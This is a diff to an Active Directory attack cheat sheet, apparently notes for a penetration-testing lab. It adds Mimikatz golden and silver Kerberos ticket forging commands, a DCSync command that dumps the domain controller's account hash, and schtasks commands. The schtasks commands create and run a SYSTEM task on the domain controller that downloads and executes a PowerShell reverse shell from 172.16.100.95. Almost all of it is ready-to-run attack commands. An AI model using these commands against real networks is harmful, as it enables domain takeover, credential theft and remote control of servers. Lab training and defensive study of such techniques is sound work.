@@ -756,6 +756,14 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporat
 # Or
 BetterSafetyKatz "kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /aes256:XXX  /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 # Instead of /ptt (which passes the ticket to the interactive session), /ticket can be used to save the ticket to a file (to be reused)
+# Now we should be able to access the domain controller (at least c$ and scheduled task)
+
+# Create a Scheduled task "GTCheck" (download and execute a Powershell - Specifically a reverse shell)
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "GTCheck" /TR "powershell.exe -c 'iex (iwr http://172.16.100.95/Tools/Invoke-PowerShellTcp.ps1 -UseBasicParsing)'"
+
+# Execute the Scheduled task "GTCheck" (download and execute a Powershell - Specifically a reverse shell)
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local "GTCheck"
+
 
 ```
 
@@ -774,15 +782,17 @@ BetterSafetyKatz "kerberos::golden /User:Administrator /domain:corporate.corp.lo
 # HOST + HTTP +(WSMAN + RPCSS) -> WinRM
 # RPCSS + LDAP + CIFS          -> Windows RSAT
 
-Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:XXXX /user:Administrator  /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
-BetterSafetyKatz "kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:XXXX /user:Administrator  /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+# Having domain admin access, request the domain controller ntlm hash
+Invoke-Mimi -Command '"lsadump::dcsync /user:dcorp\dcorp-dc$"'
 
-```
-```
+# Request a silver ticket for HOST service
+Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:XXXX /user:Administrator  /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+BetterSafetyKatz "kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:XXXX /user:Administrator  /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
 # Create a Scheduled task "STCheck" (download and execute a Powershell - Specifically a reverse shell)
-schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (iwr http://172.16.100.95/Tools/Invoke-PowerShellTcp.ps1 -UseBasicParsing)'"```
-```
-# Execute Scheduled task (download and execute a Powershell - Specifically a reverse shell)
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (iwr http://172.16.100.95/Tools/Invoke-PowerShellTcp.ps1 -UseBasicParsing)'" 
+
+# Execute the Scheduled task "STCheck" (download and execute a Powershell - Specifically a reverse shell)
 schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local "STCheck"
 ```
 
